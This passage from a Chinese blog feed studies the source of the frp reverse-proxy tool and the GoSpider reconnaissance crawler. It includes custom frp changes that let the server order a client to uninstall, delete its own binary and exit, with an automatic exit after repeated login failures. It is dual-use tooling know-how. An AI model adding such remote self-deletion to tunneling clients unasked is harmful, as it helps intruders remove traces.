class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pxy *BaseProxy)</span></span> GetWorkConnFromPool(src, dst net.Addr) (workConn net.Conn, err <span class="hljs-type">error</span>) &#123;<br>xl := xlog.FromContextSafe(pxy.ctx)<br><span class="hljs-comment">// try all connections from the pool</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; pxy.poolCount+<span class="hljs-number">1</span>; i++ &#123;<br><span class="hljs-comment">// 获取一个工作连接</span><br><span class="hljs-keyword">if</span> workConn, err = pxy.getWorkConnFn(); err != <span class="hljs-literal">nil</span> &#123;<br>xl.Warnf(<span class="hljs-string">&quot;failed to get work connection: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>xl.Debugf(<span class="hljs-string">&quot;get a new work connection: [%s]&quot;</span>, workConn.RemoteAddr().String())<br>xl.Spawn().AppendPrefix(pxy.GetName())<br>workConn = netpkg.NewContextConn(pxy.ctx, workConn)<br><br><span class="hljs-keyword">var</span> (<br>srcAddr    <span class="hljs-type">string</span><br>dstAddr    <span class="hljs-type">string</span><br>srcPortStr <span class="hljs-type">string</span><br>dstPortStr <span class="hljs-type">string</span><br>srcPort    <span class="hljs-type">uint64</span><br>dstPort    <span class="hljs-type">uint64</span><br>)<br><br><span class="hljs-keyword">if</span> src != <span class="hljs-literal">nil</span> &#123;<br>srcAddr, srcPortStr, _ = net.SplitHostPort(src.String())<br>srcPort, _ = strconv.ParseUint(srcPortStr, <span class="hljs-number">10</span>, <span class="hljs-number">16</span>)<br>&#125;<br><span class="hljs-keyword">if</span> dst != <span class="hljs-literal">nil</span> &#123;<br>dstAddr, dstPortStr, _ = net.SplitHostPort(dst.String())<br>dstPort, _ = strconv.ParseUint(dstPortStr, <span class="hljs-number">10</span>, <span class="hljs-number">16</span>)<br>&#125;<br><span class="hljs-comment">// 再工作连接中向客户端发送开始工作消息 msg.StartWorkConn</span><br>err := msg.WriteMsg(workConn, &amp;msg.StartWorkConn&#123;<br>ProxyName: pxy.GetName(),<br>SrcAddr:   srcAddr,<br>SrcPort:   <span class="hljs-type">uint16</span>(srcPort),<br>DstAddr:   dstAddr,<br>DstPort:   <span class="hljs-type">uint16</span>(dstPort),<br>Error:     <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>xl.Warnf(<span class="hljs-string">&quot;failed to send message to work connection from pool: %v, times: %d&quot;</span>, err, i)<br>workConn.Close()<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>xl.Errorf(<span class="hljs-string">&quot;try to get work connection failed in the end&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// 找一下这个工作连接的获取</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctl *Control)</span></span> GetWorkConn() (workConn net.Conn, err <span class="hljs-type">error</span>) &#123;<br>xl := ctl.xl<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> err := <span class="hljs-built_in">recover</span>(); err != <span class="hljs-literal">nil</span> &#123;<br>xl.Errorf(<span class="hljs-string">&quot;panic error: %v&quot;</span>, err)<br>xl.Errorf(<span class="hljs-type">string</span>(debug.Stack()))<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">var</span> ok <span class="hljs-type">bool</span><br><span class="hljs-comment">// get a work connection from the pool</span><br><span class="hljs-comment">// 从连接池中取一个工作连接</span><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> workConn, ok = &lt;-ctl.workConnCh:<br><span class="hljs-keyword">if</span> !ok &#123;<br>err = pkgerr.ErrCtlClosed<br><span class="hljs-keyword">return</span><br>&#125;<br>xl.Debugf(<span class="hljs-string">&quot;get work connection from pool&quot;</span>)<br><span class="hljs-keyword">default</span>:<br><span class="hljs-comment">// no work connections available in the poll, send message to frpc to get more</span><br><span class="hljs-comment">// 没有的话就发送一个请求工作连接的请求, 让客户端在新建一个工作连接过来</span><br><span class="hljs-keyword">if</span> err := ctl.msgDispatcher.Send(&amp;msg.ReqWorkConn&#123;&#125;); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;control is already closed&quot;</span>)<br>&#125;<br><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> workConn, ok = &lt;-ctl.workConnCh:<br><span class="hljs-keyword">if</span> !ok &#123;<br>err = pkgerr.ErrCtlClosed<br>xl.Warnf(<span class="hljs-string">&quot;no work connections available, %v&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">case</span> &lt;-time.After(time.Duration(ctl.serverCfg.UserConnTimeout) * time.Second):<br>err = fmt.Errorf(<span class="hljs-string">&quot;timeout trying to get work connection&quot;</span>)<br>xl.Warnf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">// When we get a work connection from pool, replace it with a new one.</span><br><span class="hljs-comment">// 当一个工作连接被取出就让客户端在来一个新的</span><br>_ = ctl.msgDispatcher.Send(&amp;msg.ReqWorkConn&#123;&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><ol><li>从 ctl.workConnCh 中拿一个工作连接，取出之后服务端会再发送 msg.ReqWorkConn 让客户端再建立一个工作连接</li><li>在这个工作连接中发送 msg.StartWorkConn 表示开始工作</li></ol><p>然后关于客户端、服务端、用户之间的处理就完了。</p><h2 id="二开记录"><a href="#二开记录" class="headerlink" title="二开记录"></a>二开记录</h2><h3 id="添加-frps-控制-frpc-退出功能"><a href="#添加-frps-控制-frpc-退出功能" class="headerlink" title="添加 frps 控制 frpc 退出功能"></a>添加 frps 控制 frpc 退出功能</h3><p><code>pkg/msg/msg.go</code>​ 添加一个用于表示退出消息的结构体：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">type StopClient struct &#123;<br>Bye string `json:&quot;bye,omitempty&quot;`<br>&#125;<br></code></pre></td></tr></table></figure><p>然后在 <code>msgTypeMap</code>​ 和上面的 <code>const</code>​ 定义这里加上：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250130194228-q7uzfmv.png?imageSlim" alt="image-20250130194228-q7uzfmv.png"></p><h4 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h4><p>添加一个方法用于通过代理名称去向对应的客户端发送退出消息：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(svr *Service)</span></span> StopClientByProxyName(proxyName <span class="hljs-type">string</span>) &#123;<br><span class="hljs-comment">// 通过代理名称获取 runID</span><br>pxy, _ := svr.pxyManager.GetByName(proxyName)<br>runID := pxy.GetLoginMsg().RunID<br><span class="hljs-comment">// 通过 runID 拿到控制器</span><br>ctl, _ := svr.ctlManager.GetByID(runID)<br><span class="hljs-comment">// 使用控制器的消息调度器发送关闭消息</span><br>err := ctl.msgDispatcher.Send(&amp;msg.StopClient&#123;&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;Stop Client [%v] [%v] Failed %v\n&quot;</span>, proxyName, runID, err.Error())<br><span class="hljs-keyword">return</span><br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;Stop Client [%v] [%v] Success !\n&quot;</span>, proxyName, runID)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>server/dashboard_api.go</code>​ 添加 API：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">// DELETE /api/client?proxyName=offline</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(svr *Service)</span></span> deleteClient(w http.ResponseWriter, r *http.Request) &#123;<br>res := GeneralResponse&#123;Code: <span class="hljs-number">200</span>&#125;<br>log.Infof(<span class="hljs-string">&quot;Http request: [%s]&quot;</span>, r.URL.Path)<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>log.Infof(<span class="hljs-string">&quot;Http response [%s]: code [%d]&quot;</span>, r.URL.Path, res.Code)<br>w.WriteHeader(res.Code)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(res.Msg) &gt; <span class="hljs-number">0</span> &#123;<br>_, _ = w.Write([]<span class="hljs-type">byte</span>(res.Msg))<br>&#125;<br>&#125;()<br>proxyName := r.URL.Query().Get(<span class="hljs-string">&quot;proxyName&quot;</span>)<br><span class="hljs-keyword">if</span> proxyName != <span class="hljs-string">&quot;&quot;</span> &#123;<br>svr.StopClientByProxyName(proxyName)<br>res.Code = <span class="hljs-number">200</span><br>res.Msg = <span class="hljs-string">&quot;client success !&quot;</span><br>&#125;<br>log.Infof(<span class="hljs-string">&quot;client success !&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>注册路由：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs golang">subRouter.HandleFunc(<span class="hljs-string">&quot;/api/client&quot;</span>, svr.deleteClient).Methods(<span class="hljs-string">&quot;DELETE&quot;</span>)<br></code></pre></td></tr></table></figure><p>vue web 修改：<code>web/frps/src/components/ProxyView.vue</code>​</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs typescript">  &lt;el-table-column label=<span class="hljs-string">&quot;Operations&quot;</span>&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">default</span>=<span class="hljs-string">&quot;scope&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">:name</span>=<span class="hljs-string">&quot;scope.row.name&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-bottom: 10px&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;dialogVisibleName = scope.row.name; dialogVisible = true&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      &gt;</span>Traffic</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- 添加退出按钮 --&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">:name</span>=<span class="hljs-string">&quot;scope.row.name&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-bottom: 10px&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;exitClientByPxyName(scope.row.name)&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      &gt;</span>Exit</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span><br>  &lt;/el-table-column&gt;<br></code></pre></td></tr></table></figure><p>方法：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">exitClientByPxyName</span> = (<span class="hljs-params"><span class="hljs-attr">proxyName</span>: <span class="hljs-built_in">any</span></span>) =&gt; &#123;<br>  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;../api/client?proxyName=&#x27;</span> + proxyName, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;DELETE&#x27;</span>,<br>    <span class="hljs-attr">credentials</span>: <span class="hljs-string">&#x27;include&#x27;</span>,<br>  &#125;)<br>  <span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;refresh&#x27;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>然后 npm 重新编译即可。</p><h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4><p><code>client/control.go</code>​ 注册消息处理程序：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript">ctl.<span class="hljs-property">msgDispatcher</span>.<span class="hljs-title class_">RegisterHandler</span>(&amp;msg.<span class="hljs-property">StopClient</span>&#123;&#125;, ctl.<span class="hljs-property">handleStop</span>)<br><br><span class="hljs-title function_">func</span> (ctl *<span class="hljs-title class_">Control</span>) <span class="hljs-title function_">handleStop</span>(<span class="hljs-params">m msg.<span class="hljs-title class_">Message</span></span>) &#123;<br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;Client Stop .&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-title function_">len</span>(os.<span class="hljs-property">Args</span>) &gt; <span class="hljs-number">1</span> &#123;<br>cmd := exec.<span class="hljs-title class_">Command</span>(os.<span class="hljs-property">Args</span>[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;uninstall&quot;</span>)<br>_ = cmd.<span class="hljs-title class_">Run</span>()<br>&#125;<br>ctl.<span class="hljs-title class_">GracefulClose</span>(<span class="hljs-number">0</span>)<br><span class="hljs-comment">// 删除自身</span><br>del.<span class="hljs-title class_">DeleteSelf</span>()<br>os.<span class="hljs-title class_">Exit</span>(<span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="客户端退出"><a href="#客户端退出" class="headerlink" title="客户端退出"></a>客户端退出</h3><p>原本只有首次登录失败退出这个选项，但是有时候服务端已经没了，客户端还在请求。</p><p>所以修改，记录登录失败的次数，如果大于 500 就退出</p><p>客户端 <code>Service</code>​ 添加失败计数器：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-title class_">LoginFailedCount</span> uint64<br></code></pre></td></tr></table></figure><p><code>loginFunc</code>​ 这里失败退出的地方都加上计算：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript">atomic.<span class="hljs-title class_">AddUint64</span>(&amp;svr.<span class="hljs-property">LoginFailedCount</span>, <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>可以在 <code>loginFunc</code>​ 这里就添加判断退出逻辑，或者新运行一个协程去处理。</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoSpider 源码学习</title>
      <link href="/2024/03/12/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/GoSpider/"/>
      <url>/2024/03/12/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/GoSpider/</url>
      
        <content type="html"><![CDATA[<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>项目地址：<a href="https://github.com/jaeles-project/gospider">https://github.com/jaeles-project/gospider</a></p><p>goSpider 是一款静态爬虫，之前读了 crawlergo 动态爬虫，现在来看一看静态爬虫。</p><p>介绍如下：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240323004407171.png?imageSlim" alt="image-20240323004407171"></p><p>url：</p><ul><li>sitemap 站点地图</li><li>robots.txt</li><li>Wayback Machine、Common Crawl、Virus Total、Alien Vault 从外部获取 url 和 <a href="https://github.com/lc/gau">lc&#x2F;gau</a> 差不多</li><li>响应中提取</li></ul><p>响应：</p><ul><li>subdomains</li><li>aws-s3</li></ul><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">├── core<br>│   ├── crawler.go# 爬虫<br>│   ├── grep.go# 提取子域名、S3<br>│   ├── linkfinder.go# 从响应中寻找路径<br>│   ├── logger.go# 日志<br>│   ├── othersource.go# 其他源 ( 外部获取 )<br>│   ├── output.go# 输出<br>│   ├── robots.go# 从 robots.txt 中提取<br>│   ├── sitemap.go# 从站点地图中提取<br>│   ├── utils.go# 工具<br>│   └── version.go<br>├── Dockerfile<br>├── main.go<br>├── README.md<br>└── stringset<br>    ├── filter.go# 链接判重<br>    └── set.go<br></code></pre></td></tr></table></figure><h2 id="源码学习"><a href="#源码学习" class="headerlink" title="源码学习"></a>源码学习</h2><p>crawler.go 是爬行的具体实现，先看一下 NewCrawler：</p><p>这里可以看到它使用了 colly 爬虫框架去完成整个爬虫的初始化操作。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewCrawler</span><span class="hljs-params">(site *url.URL, cmd *cobra.Command)</span></span> *Crawler &#123;<br><span class="hljs-comment">// 获取根域名</span><br>domain := GetDomain(site)<br><span class="hljs-keyword">if</span> domain == <span class="hljs-string">&quot;&quot;</span> &#123;<br>Logger.Error(<span class="hljs-string">&quot;Failed to parse domain&quot;</span>)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br>Logger.Infof(<span class="hljs-string">&quot;Start crawling: %s&quot;</span>, site)<br><br>quiet, _ := cmd.Flags().GetBool(<span class="hljs-string">&quot;quiet&quot;</span>)<br>jsonOutput, _ := cmd.Flags().GetBool(<span class="hljs-string">&quot;json&quot;</span>)<br>maxDepth, _ := cmd.Flags().GetInt(<span class="hljs-string">&quot;depth&quot;</span>)<br>concurrent, _ := cmd.Flags().GetInt(<span class="hljs-string">&quot;concurrent&quot;</span>)<br>delay, _ := cmd.Flags().GetInt(<span class="hljs-string">&quot;delay&quot;</span>)<br>randomDelay, _ := cmd.Flags().GetInt(<span class="hljs-string">&quot;random-delay&quot;</span>)<br>length, _ := cmd.Flags().GetBool(<span class="hljs-string">&quot;length&quot;</span>)<br>raw, _ := cmd.Flags().GetBool(<span class="hljs-string">&quot;raw&quot;</span>)<br>subs, _ := cmd.Flags().GetBool(<span class="hljs-string">&quot;subs&quot;</span>)<br><span class="hljs-comment">// 使用 colly 爬虫</span><br>c := colly.NewCollector(<br>colly.Async(<span class="hljs-literal">true</span>),<span class="hljs-comment">// 异步</span><br>colly.MaxDepth(maxDepth),<span class="hljs-comment">// 深度</span><br>colly.IgnoreRobotsTxt(),<span class="hljs-comment">// 忽略 robots</span><br>)<br><br><span class="hljs-comment">// Setup http client</span><br>client := &amp;http.Client&#123;&#125;<br><br><span class="hljs-comment">// Set proxy</span><br>proxy, _ := cmd.Flags().GetString(<span class="hljs-string">&quot;proxy&quot;</span>)<br><span class="hljs-keyword">if</span> proxy != <span class="hljs-string">&quot;&quot;</span> &#123;<br>Logger.Infof(<span class="hljs-string">&quot;Proxy: %s&quot;</span>, proxy)<br>pU, err := url.Parse(proxy)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>Logger.Error(<span class="hljs-string">&quot;Failed to set proxy&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 设置代理 http.ProxyURL 这个东西是我之前不知道的 学到了</span><br>DefaultHTTPTransport.Proxy = http.ProxyURL(pU)<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// Set request timeout</span><br>timeout, _ := cmd.Flags().GetInt(<span class="hljs-string">&quot;timeout&quot;</span>)<br><span class="hljs-keyword">if</span> timeout == <span class="hljs-number">0</span> &#123;<br>Logger.Info(<span class="hljs-string">&quot;Your input timeout is 0. Gospider will set it to 10 seconds&quot;</span>)<br>client.Timeout = <span class="hljs-number">10</span> * time.Second<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>client.Timeout = time.Duration(timeout) * 